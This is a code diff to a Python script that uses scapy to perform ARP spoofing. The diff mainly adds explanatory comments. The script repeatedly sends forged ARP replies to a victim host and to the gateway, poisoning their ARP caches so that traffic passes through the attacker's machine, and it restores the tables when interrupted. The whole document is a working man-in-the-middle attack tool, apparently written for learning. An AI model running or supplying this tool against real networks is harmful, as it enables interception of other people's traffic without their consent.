@@ -14,20 +14,23 @@ def get_mac(ip):
 
 
 def spoof(source_ip, dest_ip):
+    # send() if python2 is used, custom ether frame not needed
     mac = get_mac(source_ip)
     ether = scapy.Ether(dst=mac)
+    # by default op=1, which is arp request, op=2: arp reply
     arp = scapy.ARP(op=2, psrc=dest_ip, pdst=source_ip, hwdst=mac)
     packet = ether / arp
     scapy.sendp(packet, verbose=False)
 
 
 def restore(source, dest):
+    # only source mac is added here, otherwise it is the same as spoof function
     destination_mac = get_mac(dest)
     source_mac = get_mac(source)
     ether = scapy.Ether(dst=source_mac)
     arp_restore = scapy.ARP(op=2,pdst=dest,hwdst=destination_mac,psrc=source,hwsrc=source_mac)
     packet = ether / arp_restore
-    scapy.sendp(packet, count=4, verbose=False)
+    scapy.sendp(packet, count=4, verbose=False) # increased count to 4 so that it gets delivered without fail
 
 
 def get_ip_address():
@@ -47,15 +50,15 @@ def run():
         source_ip, router_ip = get_ip_address()
         packets_sent_count = 0
         while True:
-            spoof(source_ip, router_ip)
-            spoof(router_ip, source_ip)
+            spoof(source_ip, router_ip) # once to spoof gateway
+            spoof(router_ip, source_ip) # once more to spoof the router
             packets_sent_count += 2
             print(f"\r[+] Packets Sent: {packets_sent_count}", end="")
             time.sleep(2)
     except KeyboardInterrupt:
-        print("\n\n[-] Detected Ctrl+C ..... Exiting!")
-        restore(source_ip, router_ip)
-        restore(router_ip, source_ip)
+        print("\n\n[-] Detected Ctrl+C ..... Exiting!") 
+        restore(source_ip, router_ip) # once to restore gateway
+        restore(router_ip, source_ip) # once more to restore the router
 
 
 run()
